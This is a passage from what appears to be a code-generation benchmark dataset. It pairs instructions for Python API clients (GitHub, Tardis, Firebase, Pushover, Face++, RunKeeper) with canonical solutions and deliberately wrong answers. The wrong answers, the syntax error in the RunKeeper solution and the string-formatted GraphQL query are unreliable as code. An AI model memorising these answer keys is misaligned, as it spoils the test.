    "Canonical_solution": "import requests\nimport os\nimport sys\nfrom datetime import datetime, timedelta\n\n\nGITHUB_GRAPHQL_URL = \"https://api.github.com/graphql\"\n\n\ndef get_github_project_info(github_token, github_org, github_project):\n    headers = {\n        \"Authorization\": f\"Bearer {github_token}\",\n        \"Content-Type\": \"application/json\"\n    }\n    query = '''\n    {\n      organization(login: \"%s\") {\n        projectsV2(first: 20) {\n          nodes {\n            id\n            title\n            number\n          }\n        }\n      }\n    }\n    ''' % (github_org)\n    payload = {\n        \"query\": query\n    }\n\n    response = requests.post(GITHUB_GRAPHQL_URL, headers=headers, json=payload)\n    if response.status_code == 200:\n        # fine project by title\n        nodes = response.json().get(\"data\").get(\"organization\").get(\"projectsV2\").get(\"nodes\")\n        for node in nodes:\n            if node.get(\"title\") == github_project:\n                return node\n    else:\n        response.raise_for_status()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\ndef get_github_project_info(github_token, github_org, github_project):\n    headers = {\n        'Authorization': f'Bearer {github_token}',\n        'Content-Type': 'application/json',\n        'User-Agent': 'PythonScript'\n    }\n\n    query = \"\"\"\n    query($org: String!, $projectTitle: String!) {\n        organization(login: $org) {\n            project(title: $projectTitle) {\n                id\n                title\n                number\n            }\n        }\n    }\n    \"\"\"\n\n    variables = {\n        \"org\": github_org,\n        \"projectTitle\": github_project\n    }\n\n    response = requests.post(\n        'https://api.github.com/graphql',\n        headers=headers,\n        json={'query': query, 'variables': variables}\n    )\n\n    response.raise_for_status()\n\n    data = response.json()\n    project_data = data.get('data', {}).get('organization', {}).get('project')\n\n    if project_data:\n        return {\n            'id': project_data['id'],\n            'title': project_data['title'],\n            'number': project_data['number']\n        }\n    return None\n```"
  },
  {
    "Task_id": 67,
    "Instruction": "Task Description: Create a function to download financial market data from a specific API endpoint, handling authentication, progress tracking, and error checking during the download process.\n\nFunction Description: The function downloads compressed CSV data from a REST API endpoint for a given exchange, data type, symbol, and date. It streams the download to efficiently handle large files, shows progress using a progress bar, verifies the download completeness, and saves the data to a specified file path. The function includes proper error handling for failed requests or incomplete downloads.\n\nInput:\n- exchange: [str] - The financial exchange identifier (e.g., 'binance')\n- data_type: [str] - The type of market data to download (e.g., 'trades')\n- symbol: [str] - The trading symbol/pair (e.g., 'BTCUSDT')\n- yyyymmdd: [int/str] - The date in YYYYMMDD format\n- filepath: [str] - The local path where the downloaded file should be saved\n- key: [str] - The API authorization key (Bearer token)\n\nOutput:\n- None - The function doesn't return anything but saves the downloaded data to the specified file path\n- Raises RuntimeError if the download fails (either due to HTTP error or incomplete download)",
    "Canonical_solution": "import json\nimport os.path\nimport requests\nfrom datetime import datetime, timedelta\nfrom tqdm import tqdm\n\ndef download(exchange, data_type, symbol, yyyymmdd, filepath, key):\n    yyyymmdd = str(yyyymmdd)\n    url = f'https://datasets.tardis.dev/v1/{exchange}/{data_type}/{yyyymmdd[:4]}/{yyyymmdd[4:6]}/{yyyymmdd[6:]}/{symbol}.csv.gz'\n\n    response = requests.get(url, stream=True, headers={'Authorization': f'Bearer {key}'})\n    if response.status_code != 200:\n        raise RuntimeError('Could not download file')\n\n    total_size = int(response.headers.get('content-length', 0))\n    block_size = 1024\n\n    with tqdm(total=total_size, unit='B', unit_scale=True) as progress_bar:\n        with open(filepath, 'wb') as file:\n            for data in response.iter_content(block_size):\n                progress_bar.update(len(data))\n                file.write(data)\n\n    if total_size != 0 and progress_bar.n != total_size:\n        raise RuntimeError('Could not download file')",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nfrom tqdm import tqdm\n\ndef download_market_data(exchange, data_type, symbol, yyyymmdd, filepath, key):\n    url = f\"https://api.example.com/{exchange}/{data_type}/{symbol}/{yyyymmdd}.csv.gz\"\n    headers = {\"Authorization\": f\"Bearer {key}\"}\n    \n    try:\n        response = requests.get(url, headers=headers, stream=True)\n        response.raise_for_status()\n        \n        total_size_in_bytes = int(response.headers.get('content-length', 0))\n        block_size = 1024 * 1024  # 1 MB\n        \n        with open(filepath, 'wb') as file, tqdm(\n            desc=os.path.basename(filepath),\n            total=total_size_in_bytes,\n            unit='iB',\n            unit_scale=True,\n            unit_divisor=1024,\n        ) as progress_bar:\n            for chunk in response.iter_content(chunk_size=block_size):\n                if chunk:\n                    file.write(chunk)\n                    progress_bar.update(len(chunk))\n                    \n        if os.path.getsize(filepath) != total_size_in_bytes and total_size_in_bytes > 0:\n            raise RuntimeError(\"Downloaded file size does not match expected size\")\n            \n    except requests.HTTPError as e:\n        raise RuntimeError(f\"HTTP error occurred: {e}\")\n    except Exception as e:\n        raise RuntimeError(f\"An error occurred during the download: {e}\") from e\n```"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a function that scrapes and extracts text content from paragraphs of a given URL using HTTP requests and HTML parsing.\n\nFunction Description: The function should make an HTTP GET request to the specified URL, parse the HTML response to extract text from all paragraph elements (<p>), and return the combined text. It should handle potential errors in the HTTP request and log successful operations.\n\nInput: \n- url (str): The URL of the webpage to scrape text from.\n\nOutput: \n- str: The combined text extracted from all paragraph elements on the webpage, or an error message if the request fails.",
    "Canonical_solution": "import requests\nfrom bs4 import BeautifulSoup\nimport logging\n\ndef scrape_text_from_url(url):\n    response = requests.get(url)\n    if response.status_code != 200:\n        return \"Error: Could not retrieve content from URL.\"\n    soup = BeautifulSoup(response.text, \"html.parser\")\n    paragraphs = soup.find_all(\"p\")\n    text = \" \".join([p.get_text() for p in paragraphs])\n    logging.info(\"web scrape done\")\n    return text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom bs4 import BeautifulSoup\nimport logging\n\ndef scrape_paragraph_text(url):\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        soup = BeautifulSoup(response.text, 'html.parser')\n        paragraphs = soup.find_all('p')\n        text_content = ' '.join(p.get_text() for p in paragraphs)\n        logging.info(f\"Successfully scraped text from {url}\")\n        return text_content\n    except requests.RequestException as e:\n        logging.error(f\"HTTP request failed for {url}: {e}\")\n        return f\"Error: HTTP request failed - {e}\"\n```"
  },
  {
    "Task_id": 72,
    "Instruction": "Task Description: Create a Python function that interacts with two different APIs: one for text-to-image generation (Hugging Face) and another for cloud storage (Firebase). The function should first generate an image from text using Hugging Face's API, then upload the resulting image to Firebase Storage.\n\nFunction Description: The function should take a text prompt as input, use it to generate an image via Hugging Face's API, and then upload that image to Firebase Storage. It should handle API errors gracefully and return the Firebase URL of the uploaded image.\n\nInput:\n- prompt (str): The text prompt to be converted into an image\n- destination_path (str): The path where the image should be stored in Firebase Storage\n\nOutput:\n- str: The Firebase Storage URL of the uploaded image, or None if either API call fails\n\nTask Description: Create a Python class that encapsulates the functionality for interacting with Hugging Face's text-to-image API and Firebase Storage API.\n\nClass Description: The class should manage API connections and provide methods for generating images from text and storing them in cloud storage. It should store necessary API credentials and configuration.\n\nAttributes:\n- HUGGING_FACE_API_URL (str): The endpoint URL for Hugging Face's text-to-image API\n- FIREBASE_API_URL (str): The base URL for Firebase Storage API\n- headers (dict): Authorization headers for Hugging Face API\n- API_KEY_PARAM (str): The API key parameter for Firebase requests\n- FIREBASE_STORAGE_BUCKET (str): The name of the Firebase Storage bucket\n\nMethods:\n- query(payload: dict) -> bytes: Sends a request to Hugging Face API with the given payload and returns the image data\n- upload_to_firebase_storage(image_data: bytes, destination_path: str) -> str: Uploads image data to Firebase Storage and returns the download URL\n- generate_and_store_image(prompt: str, destination_path: str) -> str: Combines both operations (generation and storage) into a single method",
    "Canonical_solution": "import requests\nfrom pydantic import Field\n\nHUGGING_FACE_API_URL = \"https://api-inference.huggingface.co/models/prompthero/openjourney-v4\"\nheaders = {\"Authorization\": f\"Bearer {HUGGING_FACE_TOKEN}\"}\nFIREBASE_API_URL = f\"https://firebasestorage.googleapis.com/v0/b/{FIREBASE_STORAGE_BUCKET}/o\"\nAPI_KEY_PARAM = f\"key={FIREBASE_API_KEY}\"\n\ndef query(payload):\n    \"\"\"\n    Queries the Hugging Face API to convert text to an image.\n    Args:\n        payload (dict): Input payload for the Hugging Face API.\n    Returns:\n        bytes: Image data.\n    \"\"\"\n    try:\n        response = requests.post(HUGGING_FACE_API_URL, headers=headers, json=payload, timeout=40)\n        return response.content\n    except requests.exceptions.RequestException as e:\n        print(f\"Error from Hugging Face API: {e}\")\n        return None\n\ndef upload_to_firebase_storage(image_data, destination_path):\n    \"\"\"\n    Uploads image data to Firebase Storage.\n    Args:\n        image_data (bytes): Image data to be uploaded.\n        destination_path (str): Path where the image will be stored.\n    Returns:\n        str: Firebase URL of the uploaded image.\n    \"\"\"\n    upload_url = f\"{FIREBASE_API_URL}/{destination_path}?{API_KEY_PARAM}\"\n    headers = {\"Content-Type\": \"image/png\"}\n\n    response = requests.post(upload_url, headers=headers, data=image_data)\n\n    if response.status_code == 200:\n        download_url = response.json().get(\"downloadTokens\", \"\")\n        firebase_url = f\"https://firebasestorage.googleapis.com/v0/b/{FIREBASE_STORAGE_BUCKET}/o/{destination_path}?alt=media&token={download_url}\"\n        return firebase_url\n    else:\n        print(\"Error uploading to Firebase Storage:\", response.content)\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\nclass ImageGenerationStorage:\n    def __init__(self, hugging_face_api_url, hugging_face_api_token, firebase_api_key, firebase_storage_bucket):\n        self.HUGGING_FACE_API_URL = hugging_face_api_url\n        self.headers = {\n            \"Authorization\": f\"Bearer {hugging_face_api_token}\",\n            \"Content-Type\": \"application/json\"\n        }\n        self.API_KEY_PARAM = firebase_api_key\n        self.FIREBASE_STORAGE_BUCKET = firebase_storage_bucket\n        self.FIREBASE_UPLOAD_URL = f\"https://firebasestorage.googleapis.com/v0/b/{firebase_storage_bucket}/o\"\n\n    def query(self, payload):\n        try:\n            response = requests.post(self.HUGGING_FACE_API_URL, headers=self.headers, json=payload)\n            response.raise_for_status()\n            return response.content\n        except requests.exceptions.RequestException as e:\n            print(f\"Hugging Face API error: {e}\")\n            return None\n\n    def upload_to_firebase_storage(self, image_data, destination_path):\n        params = {\n            \"name\": destination_path,\n            \"uploadType\": \"media\",\n            \"alt\": \"media\"\n        }\n        headers = {\n            \"Authorization\": f\"Firebase {self.API_KEY_PARAM}\",\n            \"Content-Type\": \"image/png\"\n        }\n\n        try:\n            response = requests.post(self.FIREBASE_UPLOAD_URL, params=params, headers=headers, data=image_data)\n            response.raise_for_status()\n            download_url = response.json().get(\"downloadTokens\")\n            if download_url:\n                return f\"https://firebasestorage.googleapis.com/v0/b/{self.FIREBASE_STORAGE_BUCKET}/o/{destination_path}?alt=media&token={download_url}\"\n            else:\n                return None\n        except requests.exceptions.RequestException as e:\n            print(f\"Firebase Storage error: {e}\")\n            return None\n\n    def generate_and_store_image(self, prompt, destination_path):\n        payload = {\"inputs\": prompt}\n        image_data = self.query(payload)\n        if not image_data:\n            return None\n        return self.upload_to_firebase_storage(image_data, destination_path)\n```"
  },
  {
    "Task_id": 74,
    "Instruction": "Task Description: Implement a Python class that serves as a client for the Pushover notification service, capable of sending both text messages and file attachments through HTTP requests.\n\nClass Description: The PushoverClient class provides functionality to interact with the Pushover API, allowing users to send notifications with optional HTML formatting, titles, URLs, and file attachments. It handles HTTP communication and error logging.\n\nAttributes:\n- token: str - The API token for authenticating with Pushover\n- user: str - The user key identifying the recipient\n- device: str - The target device for the notification\n- pushover_url: str - The Pushover API endpoint URL\n\nMethods:\n- send_message(title: str, message: str, send_as_html: bool, additional_url: str) -> None - Sends a text notification with optional HTML formatting, title, and URL\n- send_file(file_name: str, contents: bytes, title: str, message: str, send_as_html: bool, additional_url: str) -> None - Sends a notification with a file attachment (converts SVG to PNG if needed) along with text content",
    "Canonical_solution": "import logging\nimport requests\n\nclass PushoverClient:\n    def __init__(self, token: str, user: str, device: str, pushover_url: str):\n        self.token = str(token)\n        self.user = str(user)\n        self.device = str(device)\n        self.pushover_url = str(pushover_url)\n\n    def send_message(self, title: str, message: str, send_as_html: bool, additional_url: str):\n        message_json = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"html\": 1 if send_as_html else \"\",\n            \"title\": title,\n            \"message\": message,\n            \"url\": additional_url,\n            \"device\": self.device\n        }\n\n        response = requests.post(self.pushover_url, json=message_json)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send pushover message with reason being: {response.reason} {response.text}\"\n            )\n\n    def send_file(self, file_name: str, contents: bytes, title: str, message: str, send_as_html: bool, additional_url: str):\n        if not is_image(file_name):\n            return\n            \n        if file_name.endswith(SVG_SUFFIX):\n            contents = convert_svg_to_png(contents)\n            file_name = file_name.replace(SVG_SUFFIX, PNG_SUFFIX)\n        files = {\"photo\": (file_name, contents.decode())}\n\n        message_json = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"html\": 1 if send_as_html else \"\",\n            \"title\": title,\n            \"message\": message,\n            \"url\": additional_url,\n            \"device\": self.device\n        }\n\n        response = requests.post(self.pushover_url, json=message_json, files=files)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send pushover message with reason being: {response.reason} {response.text}\"\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport logging\nfrom PIL import Image\nfrom io import BytesIO\n\n\nclass PushoverClient:\n    def __init__(self, token: str, user: str, device: str):\n        self.token = token\n        self.user = user\n        self.device = device\n        self.pushover_url = \"https://api.pushover.net/1/messages.json\"\n\n    def send_message(self, title: str, message: str, send_as_html: bool, additional_url: str) -> None:\n        payload = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"device\": self.device,\n            \"title\": title,\n            \"message\": message,\n            \"html\": 1 if send_as_html else 0,\n        }\n        if additional_url:\n            payload[\"url\"] = additional_url\n\n        try:\n            response = requests.post(self.pushover_url, data=payload)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            logging.error(f\"Failed to send message: {e}\")\n\n    def send_file(\n        self,\n        file_name: str,\n        contents: bytes,\n        title: str,\n        message: str,\n        send_as_html: bool,\n        additional_url: str,\n    ) -> None:\n        if file_name.lower().endswith(\".svg\"):\n            try:\n                image = Image.open(BytesIO(contents))\n                png_data = BytesIO()\n                image.save(png_data, format=\"PNG\")\n                contents = png_data.getvalue()\n                file_name = file_name.rsplit(\".\", 1)[0] + \".png\"\n            except Exception as e:\n                logging.error(f\"Error converting SVG to PNG: {e}\")\n                return\n\n        files = {\"attachment\": (file_name, contents)}\n        payload = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"device\": self.device,\n            \"title\": title,\n            \"message\": message,\n            \"html\": 1 if send_as_html else 0,\n        }\n        if additional_url:\n            payload[\"url\"] = additional_url\n\n        try:\n            response = requests.post(self.pushover_url, data=payload, files=files)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            logging.error(f\"Failed to send file: {e}\")\n```"
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a Python function that interacts with the Face++ API to perform face detection on an image, including face count verification and extraction of facial attributes.\n\nFunction Description: The function uses the Face++ API to detect faces in an image, verifies that exactly one face is present, and extracts facial rectangle coordinates and headpose information. It handles various API response status codes and raises appropriate exceptions for errors.\n\nInput:\n- ctx: A context object containing:\n  - origin_image: The original image to be processed (expected to be an image object)\n\nOutput:\n- Modifies the ctx object by adding:\n  - face[\"rectangle\"]: Tuple containing (left, top, width, height) coordinates of the detected face\n  - face[\"roll_angle\"]: The roll angle of the detected face (divided by 2)\n- Raises:\n  - FaceError: When zero or multiple faces are detected\n  - APIError: For various API-related errors (authentication, authorization, bad request, etc.)",
    "Canonical_solution": "import os\nimport requests\nfrom hivision.error import FaceError, APIError\nfrom hivision.utils import resize_image_to_kb_base64\n\ndef detect_face_face_plusplus(ctx):\n    \"\"\"\n    \u57fa\u4e8eFace++ API\u63a5\u53e3\u7684\u4eba\u8138\u68c0\u6d4b\u5904\u7406\u5668\uff0c\u53ea\u8fdb\u884c\u4eba\u8138\u6570\u91cf\u7684\u68c0\u6d4b\n    :param ctx: \u4e0a\u4e0b\u6587\uff0c\u6b64\u65f6\u5df2\u83b7\u53d6\u5230\u539f\u59cb\u56fe\u548c\u62a0\u56fe\u7ed3\u679c\uff0c\u4f46\u662f\u6211\u4eec\u53ea\u9700\u8981\u539f\u59cb\u56fe\n    :raise FaceError: \u4eba\u8138\u68c0\u6d4b\u9519\u8bef\uff0c\u591a\u4e2a\u4eba\u8138\u6216\u8005\u6ca1\u6709\u4eba\u8138\n    :raise APIError: API\u8c03\u7528\u9519\u8bef\n    \"\"\"\n    url = \"https://api-cn.faceplusplus.com/facepp/v3/detect\"\n    api_key = os.getenv(\"FACE_PLUS_API_KEY\")\n    api_secret = os.getenv(\"FACE_PLUS_API_SECRET\")\n\n    image = ctx.origin_image\n    image_base64 = resize_image_to_kb_base64(image, 2000, mode=\"max\")\n\n    files = {\n        \"api_key\": (None, api_key),\n        \"api_secret\": (None, api_secret),\n        \"image_base64\": (None, image_base64),\n        \"return_landmark\": (None, \"1\"),\n        \"return_attributes\": (None, \"headpose\"),\n    }\n\n    response = requests.post(url, files=files)\n    status_code = response.status_code\n    response_json = response.json()\n\n    if status_code == 200:\n        face_num = response_json[\"face_num\"]\n        if face_num == 1:\n            face_rectangle = response_json[\"faces\"][0][\"face_rectangle\"]\n            headpose = response_json[\"faces\"][0][\"attributes\"][\"headpose\"]\n            roll_angle = headpose[\"roll_angle\"] / 2\n\n            ctx.face[\"rectangle\"] = (\n                face_rectangle[\"left\"],\n                face_rectangle[\"top\"],\n                face_rectangle[\"width\"],\n                face_rectangle[\"height\"],\n            )\n            ctx.face[\"roll_angle\"] = roll_angle\n        else:\n            raise FaceError(\n                \"Expected 1 face, but got {}\".format(face_num), len(face_num)\n            )\n    elif status_code == 401:\n        raise APIError(\n            f\"Face++ Status code {status_code} Authentication error: API key and secret do not match.\",\n            status_code,\n        )\n    elif status_code == 403:\n        reason = response_json.get(\"error_message\", \"Unknown authorization error.\")\n        raise APIError(\n            f\"Authorization error: {reason}\",\n            status_code,\n        )\n    elif status_code == 400:\n        error_message = response_json.get(\"error_message\", \"Bad request.\")\n        raise APIError(\n            f\"Bad request error: {error_message}\",\n            status_code,\n        )\n    elif status_code == 413:\n        raise APIError(\n            f\"Face++ Status code {status_code} Request entity too large: The image exceeds the 2MB limit.\",\n            status_code,\n        )",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\nclass FaceError(Exception):\n    pass\n\n\nclass APIError(Exception):\n    pass\n\n\ndef detect_face(ctx):\n    api_key = \"YOUR_API_KEY\"\n    api_secret = \"YOUR_API_SECRET\"\n    image_url = \"data:image/jpeg;base64,\" + ctx.origin_image.base64_data\n\n    url = \"https://api-us.faceplusplus.com/facepp/v3/detect\"\n    params = {\n        \"api_key\": api_key,\n        \"api_secret\": api_secret,\n        \"image_url\": image_url,\n        \"return_attributes\": \"headpose\"\n    }\n\n    response = requests.post(url, data=params)\n    result = response.json()\n\n    if response.status_code == 200:\n        faces = result.get(\"faces\", [])\n        if len(faces) != 1:\n            raise FaceError(f\"Detected {len(faces)} face(s), exactly one face is required.\")\n        \n        face_rectangle = faces[0][\"face_rectangle\"]\n        headpose = faces[0][\"attributes\"][\"headpose\"]\n\n        ctx.face = {\n            \"rectangle\": (\n                face_rectangle[\"left\"],\n                face_rectangle[\"top\"],\n                face_rectangle[\"width\"],\n                face_rectangle[\"height\"]\n            ),\n            \"roll_angle\": headpose[\"roll\"] / 2\n        }\n    elif response.status_code == 400:\n        raise APIError(\"Bad request: Invalid parameter or missing required fields.\")\n    elif response.status_code == 401:\n        raise APIError(\"Authentication failed: Check your API key and secret.\")\n    elif response.status_code == 403:\n        raise APIError(\"Authorization denied: Insufficient permissions or quota exceeded.\")\n    elif response.status_code == 500:\n        raise APIError(\"Internal server error: Try again later.\")\n    else:\n        raise APIError(f\"Unexpected HTTP status code: {response.status_code}\")\n```"
  },
  {
    "Task_id": 77,
    "Instruction": "Task Description: Implement a function to check for software updates by querying a GitHub repository's API, comparing versions, and notifying if a new version is available.\n\nFunction Description: The function `check_update()` checks for updates by making HTTP requests to GitHub's API. It handles both stable releases and pre-releases based on configuration, compares version numbers, and provides appropriate notifications/logs about update availability. The function uses external configurations for update preferences and notification settings.\n\nInput: None (uses module-level configuration from `cfg` for settings like update preferences, user agent, and current version)\n\nOutput: None (but has side effects: may log update information and send notifications through the `notif` system)",
    "Canonical_solution": "from tasks.base.fastest_mirror import FastestMirror\nfrom module.logger import log\nfrom module.config import cfg\nfrom module.notification import notif\nfrom packaging.version import parse\nimport requests\n\ndef check_update():\n    try:\n        if cfg.update_prerelease_enable:\n            response = requests.get(FastestMirror.get_github_api_mirror(\"moesnow\", \"March7thAssistant\", False), timeout=10, headers=cfg.useragent)\n        else:\n            response = requests.get(FastestMirror.get_github_api_mirror(\"moesnow\", \"March7thAssistant\"), timeout=10, headers=cfg.useragent)\n        if not cfg.check_update:\n            return\n        if response.status_code == 200:\n            if cfg.update_prerelease_enable:\n                data = response.json()[0]\n            else:\n                data = response.json()\n\n            version = data[\"tag_name\"]\n\n            assert_url = None\n            for asset in data[\"assets\"]:\n                if (cfg.update_full_enable and \"full\" in asset[\"browser_download_url\"]) or \\\n                   (not cfg.update_full_enable and \"full\" not in asset[\"browser_download_url\"]):\n                    assert_url = asset[\"browser_download_url\"]\n                    break\n\n            if assert_url is not None and parse(version.lstrip('v')) > parse(cfg.version.lstrip('v')):\n                notif.notify(cfg.notify_template['NewVersion'].format(version=version))\n                log.info(f\"\u53d1\u73b0\u65b0\u7248\u672c\uff1a{cfg.version}  \u2014\u2014\u2192  {version}\")\n                log.info(data[\"html_url\"])\n            else:\n                log.info(f\"\u5df2\u7ecf\u662f\u6700\u65b0\u7248\u672c\uff1a{cfg.version}\")\n        else:\n            log.warning(\"\u68c0\u6d4b\u66f4\u65b0\u5931\u8d25\")\n            log.debug(response.text)\n    except Exception:\n        pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport semver\n\ndef check_update():\n    import cfg\n    import notif\n\n    headers = {\n        \"User-Agent\": cfg.USER_AGENT,\n    }\n\n    url = f\"https://api.github.com/repos/{cfg.GITHUB_REPO}/releases\"\n    try:\n        response = requests.get(url, headers=headers)\n        response.raise_for_status()\n        releases = response.json()\n    except Exception as e:\n        if cfg.DEBUG:\n            print(f\"Failed to fetch releases: {e}\")\n        return\n\n    for release in releases:\n        is_prerelease = release.get(\"prerelease\", False)\n        if (is_prerelease and not cfg.ALLOW_PRERELEASE) or (not is_prerelease and not cfg.PREFER_STABLE):\n            continue\n\n        tag_name = release.get(\"tag_name\")\n        if not tag_name:\n            continue\n\n        try:\n            latest_version = semver.VersionInfo.parse(tag_name.lstrip(\"v\"))\n            current_version = semver.VersionInfo.parse(cfg.CURRENT_VERSION)\n            if latest_version > current_version:\n                message = f\"A new version is available: {tag_name}\"\n                if is_prerelease:\n                    message += \" (pre-release)\"\n                notif.send_notification(message)\n                break\n        except semver.SemVerError:\n            continue\n```"
  },
  {
    "Task_id": 78,
    "Instruction": "Task Description: Implement a GitHub Single Sign-On (SSO) class to handle authentication and user information retrieval using GitHub's OAuth API.\n\nClass Description: The GitHubSSO class provides functionality to authenticate with GitHub's OAuth system, manage access tokens, and retrieve user information including email and name details.\n\nAttributes:\n- access_token: str - GitHub OAuth access token for API authentication\n- refresh_token: str - GitHub OAuth refresh token for obtaining new access tokens\n- client_id: str - GitHub OAuth application client ID\n- client_secret: str - GitHub OAuth application client secret\n- user_info: dict - Dictionary containing user information (email, first name, last name)\n\nMethods:\n- get_new_token() -> str - Requests a new access token using the refresh token\n  Input: None\n  Output: str - New access token\n\n- get_user_info() -> dict - Retrieves user information from GitHub API\n  Input: None\n  Output: dict - Contains user's primary email, first name, and last name\n    Returns format: {\n      \"email\": str,\n      \"first_name\": str,\n      \"last_name\": str\n    }\n  Throws: HTTPException if there's an error retrieving user info",
    "Canonical_solution": "import requests\nimport logging\nfrom fastapi import HTTPException\nfrom Globals import getenv\n\nclass GitHubSSO:\n    def __init__(\n        self,\n        access_token=None,\n        refresh_token=None,\n    ):\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.client_id = getenv(\"GITHUB_CLIENT_ID\")\n        self.client_secret = getenv(\"GITHUB_CLIENT_SECRET\")\n        self.user_info = self.get_user_info()\n\n    def get_new_token(self):\n        response = requests.post(\n            \"https://github.com/login/oauth/access_token\",\n            headers={\"Accept\": \"application/json\"},\n            data={\n                \"client_id\": self.client_id,\n                \"client_secret\": self.client_secret,\n                \"refresh_token\": self.refresh_token,\n                \"grant_type\": \"refresh_token\",\n            },\n        )\n        return response.json()[\"access_token\"]\n\n    def get_user_info(self):\n        uri = \"https://api.github.com/user\"\n        response = requests.get(\n            uri,\n            headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n        )\n        if response.status_code == 401:\n            self.access_token = self.get_new_token()\n            response = requests.get(\n                uri,\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n        try:\n            data = response.json()\n            email_response = requests.get(\n                \"https://api.github.com/user/emails\",\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n            email_data = email_response.json()\n            primary_email = next(\n                email[\"email\"] for email in email_data if email[\"primary\"]\n            )\n            return {\n                \"email\": primary_email,\n                \"first_name\": (\n                    data.get(\"name\", \"\").split()[0] if data.get(\"name\") else \"\"\n                ),\n                \"last_name\": (\n                    data.get(\"name\", \"\").split()[-1] if data.get(\"name\") else \"\"\n                ),\n            }\n        except Exception as e:\n            raise HTTPException(\n                status_code=400,\n                detail=\"Error getting user info from GitHub\",\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\nclass GitHubSSO:\n    def __init__(self, client_id: str, client_secret: str, access_token: str, refresh_token: str):\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.user_info = {}\n\n    def get_new_token(self) -> str:\n        url = \"https://github.com/login/oauth/access_token\"\n        data = {\n            \"client_id\": self.client_id,\n            \"client_secret\": self.client_secret,\n            \"refresh_token\": self.refresh_token,\n            \"grant_type\": \"refresh_token\"\n        }\n        headers = {\"Accept\": \"application/json\"}\n        response = requests.post(url, data=data, headers=headers)\n        response.raise_for_status()\n        new_token = response.json()[\"access_token\"]\n        self.access_token = new_token\n        return new_token\n\n    def get_user_info(self) -> dict:\n        url = \"https://api.github.com/user\"\n        headers = {\"Authorization\": f\"token {self.access_token}\"}\n        response = requests.get(url, headers=headers)\n        response.raise_for_status()\n        user_data = response.json()\n\n        email_url = \"https://api.github.com/user/emails\"\n        email_response = requests.get(email_url, headers=headers)\n        email_response.raise_for_status()\n        primary_email = next((email[\"email\"] for email in email_response.json() if email[\"primary\"]), None)\n\n        self.user_info = {\n            \"email\": primary_email,\n            \"first_name\": user_data.get(\"name\", \"\").split()[0] if \"name\" in user_data else \"\",\n            \"last_name\": user_data.get(\"name\", \"\").split()[-1] if \"name\" in user_data else \"\"\n        }\n\n        return self.user_info\n```"
  },
  {
    "Task_id": 79,
    "Instruction": "Task Description: Create a Python class that implements HTTP client functionality for interacting with the RunKeeper API, including rate limiting, authorization handling, and standard HTTP methods (GET, POST, DELETE).\n\nClass Description: The RunKeeperAPI class provides methods to interact with the RunKeeper web service API. It handles rate limiting, authorization, and provides wrapper methods for common HTTP operations. The class includes rate limit tracking and proper error handling for API responses.\n\nAttributes:\n_RATE_LIMIT_KEY: str - Redis key used for tracking global rate limit status\n\nMethods:\n_rate_limit: [Name](endpoint: str, req_lambda: Callable) -> requests.Response - Handles rate limiting logic by checking Redis for existing rate limits and processing API responses for rate limit errors\n_api_headers: [Name](service_record: object) -> dict - Generates authorization headers for API requests using the service record's token\nget_request: [Name](url: str, service_record: object) -> dict - Performs an HTTP GET request to the specified URL with authorization headers and returns parsed JSON response\npost_request: [Name](url: str, service_record: object, data: Optional[dict]) -> requests.Response - Performs an HTTP POST request to the specified URL with optional data and authorization headers\ndelete_request: [Name](url: str, service_record: object) -> requests.Response - Performs an HTTP DELETE request to the specified URL with authorization headers\noauth_token_request: [Name](params: dict) -> str - Handles OAuth token requests by posting to the RunKeeper token endpoint and returns the access token",
    "Canonical_solution": "from tapiriik.settings import WEB_ROOT, RUNKEEPER_CLIENT_ID, RUNKEEPER_CLIENT_SECRET\nfrom tapiriik.services.api import APIException, UserException, UserExceptionType\nimport requests\nimport urllib.parse\nimport json\nfrom datetime import timedelta\nimport re\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = \"rk:rate_limit:hit\"\n\n    def _rate_limit(self, endpoint, req_lambda):\n        if redis.get(self._RATE_LIMIT_KEY) is not None:\n            raise APIException(\"RK global rate limit previously reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        response = req_lambda()\n        if response.status_code == 429:\n            if \"user\" not in response.text:\n                timeout = timedelta(minutes=15)\n                timeout_match = re.search(r\"(\\d+) (second|minute|hour|day)\", response.text)\n                if timeout_match:\n                    timeout = timedelta(**{\"%ss\" % timeout_match.group(2): float(timeout_match.group(1))}\n                redis.setex(self._RATE_LIMIT_KEY, response.text, timeout)\n                raise APIException(\"RK global rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n            else:\n                raise APIException(\"RK user rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        return response\n\n    def _api_headers(self, service_record):\n        return {\"Authorization\": \"Bearer \" + service_record.Authorization[\"Token\"],\n                \"Accept-Charset\": \"UTF-8\"}\n\n    def 